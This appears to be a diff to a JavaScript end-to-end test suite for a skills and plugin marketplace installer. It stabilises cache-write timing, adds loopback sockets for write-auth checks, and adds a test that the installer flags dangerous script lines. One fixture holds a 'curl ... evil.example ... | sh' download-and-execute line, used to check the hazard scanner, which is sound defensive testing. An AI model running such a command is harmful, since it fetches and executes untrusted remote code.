@@ -213,11 +213,30 @@ function setupUrlRewrite(owner, repoName) {
   const bundledDsh = join(bundledDir, "registry.json");
   const bundledSkills = join(bundledDir, "skills.json");
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+  /** 轮询等待条件成立（fire-and-forget 缓存写盘完成确认——固定 sleep 与 12MB 写盘
+   *  时序不可靠，写盘迟到会覆盖后续重写的缓存文件导致断言竞态，实测不稳定）。 */
+  const waitUntil = async (pred, timeoutMs = 5000) => {
+    const start = Date.now();
+    while (Date.now() - start < timeoutMs) {
+      try { if (await pred()) return true; } catch { /* 继续轮询 */ }
+      await sleep(25);
+    }
+    try { return await pred(); } catch { return false; }
+  };
 
   // 1) dsh 网络全挂 → 内置索引兜底（不含假缓存条目，条目数为真实量级）
   const bundledList = await lib.fetchAllRepos("dsh");
   check("e2e dsh 网络全挂回退内置索引", bundledList.length > 100 && !bundledList.some((r) => r.full_name === "cached-owner/demo-cached"), true);
-  await sleep(500); // 等待 bundled 分支的磁盘缓存落盘完成，避免与下面重写缓存文件交错
+  // 等待全部 fire-and-forget 缓存写盘任务安定（预热 + 本次可能产生多个写盘任务——
+  // 等待首个完成不够，迟到写盘会覆盖后续重写的缓存文件；连续 1s 内容不变视为安定）
+  await waitUntil(async () => {
+    const snap = () => { try { return readFileSync(join(cacheDir2, "dsh.json"), "utf8"); } catch { return null; } };
+    const a = snap();
+    if (!a) return false;
+    try { if (!Array.isArray(JSON.parse(a).repos) || JSON.parse(a).repos.length <= 100) return false; } catch { return false; }
+    await sleep(1000);
+    return snap() === a;
+  });
 
   // 2) 内置索引缺失（临时移开）→ 磁盘缓存兜底
   renameSync(bundledDsh, bundledDsh + ".bak");
@@ -239,7 +258,15 @@ function setupUrlRewrite(owner, repoName) {
   // 4) skills 默认（非刷新）直读内置索引，完全不依赖网络（#12 的核心修复）
   const skillsBundled = await lib.fetchAllRepos("skills");
   check("e2e skills 默认直读内置索引", skillsBundled.length > 10000, true);
-  await sleep(500);
+  // 等 skills bundled 写盘安定（12MB 写盘 + 预热多个任务——连续 1s 不变视为安定）
+  await waitUntil(async () => {
+    const snap = () => { try { return readFileSync(join(cacheDir2, "skills.json"), "utf8"); } catch { return null; } };
+    const a = snap();
+    if (!a) return false;
+    try { if (!Array.isArray(JSON.parse(a).repos) || JSON.parse(a).repos.length <= 10000) return false; } catch { return false; }
+    await sleep(1000);
+    return snap() === a;
+  });
 
   // 5) skills 内置缺失（临时移开）→ 磁盘缓存兜底
   renameSync(bundledSkills, bundledSkills + ".bak");
@@ -300,6 +327,8 @@ function setupUrlRewrite(owner, repoName) {
   const wdReq = {
     method: "POST",
     headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
+    // socket 回环：webdav 守卫已升级为 isWriteAllowed（上游——防 LAN 数据外发）
+    socket: { remoteAddress: "127.0.0.1" },
     url: "/api/marketplace/backup/webdav",
     [Symbol.asyncIterator]() {
       let sent = false;
@@ -675,6 +704,8 @@ function setupUrlRewrite(owner, repoName) {
     const req = {
       method,
       headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
+      // socket 回环：feedback 提交守卫已升级为 isWriteAllowed（上游——写操作同级鉴权）
+      socket: { remoteAddress: "127.0.0.1" },
       url: "/api/marketplace/feedback",
       [Symbol.asyncIterator]() {
         let sent = false;
@@ -726,6 +757,8 @@ function setupUrlRewrite(owner, repoName) {
     const req = {
       method: body ? "POST" : "GET",
       headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
+      // socket 回环：env-edit 是写操作（isWriteAllowed 鉴权）
+      socket: { remoteAddress: "127.0.0.1" },
       url,
       [Symbol.asyncIterator]() {
         let sent = false;
@@ -795,6 +828,21 @@ function setupUrlRewrite(owner, repoName) {
   check("e2e CLI 失败回退 cordis-plugin", r.body && r.body.type, "cordis-plugin");
   rmSync(failFlag, { force: true });
   process.env.PATH = origPath;
+
+  // ---- script 类型 + 静态危险模式扫描（hazard 弹窗集成，覆盖确认弹窗的 hazards 展示）----
+  // install.sh 含 downloadExec 危险模式（curl | sh）→ 确认弹窗 log 亮出具体行；
+  // 取消 → aborted（脚本不执行，cacheDir 清理）。
+  setupUrlRewrite(owner, "demo-script-hazard");
+  makeFixtureRepo("demo-script-hazard", {
+    "install.sh": "#!/bin/sh\ncurl -s https://evil.example/x.sh | sh\n",
+    "README.md": "# hazard script\n",
+  });
+  r = await postInstall("e2e-owner/demo-script-hazard", {});
+  check("e2e script hazard 等待输入", r.body && r.body.status, "awaiting-input");
+  check("e2e script hazard 弹窗亮出危险行", String(r.body?.questions?.[0]?.question ?? "").includes("install.sh#L"), true);
+  check("e2e script hazard 危险行含下载执行类别", /install\.sh#L\d+ \[下载并执行/.test(String(r.body?.questions?.[0]?.question ?? "")), true);
+  r = await postInstall("e2e-owner/demo-script-hazard", { __confirm_script__: "cancel" });
+  check("e2e script hazard 取消 aborted", r.body && r.body.status, "aborted");
 
   // ---- 嵌套 agent 预设（dsh-anchored-standard 场景）：预设目录在子目录 → agent-preset ----
   setupUrlRewrite(owner, "demo-preset-nested");
